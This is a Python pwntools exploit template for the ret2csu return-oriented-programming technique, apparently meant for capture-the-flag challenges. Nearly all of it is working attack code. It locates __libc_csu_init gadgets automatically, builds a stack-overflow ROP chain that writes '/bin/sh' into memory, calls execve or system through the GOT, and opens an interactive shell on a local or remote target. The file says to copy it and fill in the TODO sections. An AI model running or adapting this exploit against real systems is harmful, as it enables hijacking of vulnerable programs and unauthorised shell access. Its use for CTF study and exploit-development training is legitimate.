#!/usr/bin/env python3
"""
Ret2CSU — Universal 3-Argument ROP Gadget Template
Use when: no 'pop rdx; ret' exists and you need to set rdx (3rd argument).

The __libc_csu_init function in statically-linked or dynamically-linked ELFs
always contains two useful gadget sequences at the end:

Gadget 1 (csu_pop): [rbx, rbp, r12, r13/rdi, r14/rsi, r15/rdx, ret]
  → pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

Gadget 2 (csu_call): call qword ptr [r12 + rbx*8]  (then falls to gadget1)
  → mov rdx, r15
  → mov rsi, r14
  → mov edi, r13d   ← NOTE: edi (32-bit), so rdi high 32 bits are zeroed
  → call qword ptr [r12 + rbx*8]

Chain pattern:
  Set rbx=0, rbp=1, r12=&func_ptr, r13=rdi_val, r14=rsi_val, r15=rdx_val
  → csu_call: sets rdx=r15, rsi=r14, rdi=r13d; calls [r12+0]
  → After call returns → falls into csu_pop to clean stack

Usage: Copy, fill in TODO sections, adjust for your challenge.
"""
from pwn import *

# ── Target configuration ──────────────────────────────────────────────────────
BINARY  = "./ret2csu_challenge"   # TODO: path to binary
LIBC    = "./libc.so.6"           # TODO: path to libc
HOST    = "target.ctf.io"
PORT    = 1337

context.binary = elf = ELF(BINARY)
try:
    libc = ELF(LIBC)
except Exception:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"

# ── Exploit parameters ────────────────────────────────────────────────────────
OFFSET = 0   # TODO: stack offset to RIP (use cyclic_offset)

# ── Find CSU gadgets automatically ───────────────────────────────────────────
def find_csu_gadgets(elf: ELF) -> tuple[int, int]:
    """
    Locate __libc_csu_init gadgets.
    Returns (csu_pop_addr, csu_call_addr) or raises if not found.
    """
    csu = elf.sym.get("__libc_csu_init", 0)
    if not csu:
        # Try searching in .text for the pattern
        # Pattern for gadget1 (pop r15; ret): 0x415d c3
        for addr in elf.search(b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5b\x5d\xc3"):
            # Found: pop r15; pop r14; pop r13; pop r12; pop rbp; pop rbx; ret
            csu_pop = addr + 9 - 7  # adjust to start at 'pop rbx'
            csu_call = csu_pop - 0x1a  # typical offset back to mov rdx,r15
            return csu_pop, csu_call
        raise ValueError("Cannot find __libc_csu_init — binary may be stripped or use ret2dlresolve instead")

    # Standard offsets within __libc_csu_init
    # Gadget 1 (pop rbx/rbp/r12/r13/r14/r15/ret): ~last 7 instructions
    csu_pop  = csu + elf.read(csu, 200).rfind(b"\x5b\x5d") - 1
    if csu_pop < csu:
        csu_pop = csu + 0x5a  # common offset in x86_64 glibc binaries

    # Gadget 2 (mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8])
    csu_call = csu_pop - 0x1a

    return csu_pop, csu_call


def ret2csu(csu_pop: int, csu_call: int,
            func_ptr_addr: int,
            rdi: int, rsi: int, rdx: int,
            ret_addr: int = 0) -> bytes:
    """
    Build a ret2csu payload segment.
    func_ptr_addr: address in memory that contains the function pointer to call.
                   Example: elf.got['read'] — when called, executes read()
                            BUT with our rdi/rsi/rdx set!
    ret_addr: where to return after the csu chain completes (0 = leave on stack).

    After csu_call executes: rdx=rdx, rsi=rsi, rdi=rdi (lower 32 bits only!),
    calls *func_ptr_addr (destructively), then falls back to csu_pop.
    """
    # Gadget 1: load control registers
    chain  = p64(csu_pop)
    chain += p64(0)                # rbx = 0 (so rbx*8 = 0, calls r12+0)
    chain += p64(1)                # rbp = 1 (loop counter; checked after call)
    chain += p64(func_ptr_addr)    # r12 = &func_ptr → will call *r12
    chain += p64(rdi)              # r13 → edi (lower 32 bits of rdi!)
    chain += p64(rsi)              # r14 → rsi
    chain += p64(rdx)              # r15 → rdx

    # Gadget 2: set regs and call
    chain += p64(csu_call)

    # After csu_call returns, csu_pop fires again → need 7 more qwords to clean
    chain += p64(0)  # junk: add rsp, 8
    chain += p64(0)  # junk: rbx
    chain += p64(0)  # junk: rbp
    chain += p64(0)  # junk: r12
    chain += p64(0)  # junk: r13
    chain += p64(0)  # junk: r14
    chain += p64(0)  # junk: r15

    if ret_addr:
        chain += p64(ret_addr)

    return chain


# ── Example exploit: read('/bin/sh\x00' → writable, 8) then execve ────────────
def main():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path)

    try:
        csu_pop, csu_call = find_csu_gadgets(elf)
        log.success(f"csu_pop  @ {csu_pop:#x}")
        log.success(f"csu_call @ {csu_call:#x}")
    except ValueError as e:
        log.error(str(e))
        return

    # Bare ret for alignment (if needed)
    ret_gadget = next(elf.search(asm("ret")), 0)
    log.info(f"ret gadget @ {ret_gadget:#x}")

    # ── Stage 1: write "/bin/sh\x00" to BSS via read() ────────────────────────
    bss_writable = elf.bss() + 0x100
    log.info(f"writing /bin/sh to {bss_writable:#x}")

    # read(fd=0, buf=bss_writable, count=8)
    stage1 = ret2csu(
        csu_pop, csu_call,
        func_ptr_addr = elf.got["read"],  # call read()
        rdi           = 0,                # fd = stdin
        rsi           = bss_writable,     # buf
        rdx           = 8,                # count
        ret_addr      = elf.sym["main"],  # loop back for stage 2
    )

    padding = OFFSET * b"A"
    io.sendlineafter(b"> ", padding + stage1)
    io.send(b"/bin/sh\x00")  # this gets read into bss_writable

    # ── Stage 2: execve(bss_writable, NULL, NULL) ──────────────────────────────
    # NOTE: rdi via csu only sets edi (32-bit) — works if address < 0x100000000
    # If bss_writable > 0x100000000, use a pop rdi gadget for stage 2 instead.
    stage2 = ret2csu(
        csu_pop, csu_call,
        func_ptr_addr = elf.got["execve"] if "execve" in elf.got else elf.got["system"],
        rdi           = bss_writable,     # ← truncated to 32-bit via edi!
        rsi           = 0,
        rdx           = 0,
    )

    io.sendlineafter(b"> ", padding + p64(ret_gadget) + stage2)
    io.interactive()


if __name__ == "__main__":
    main()
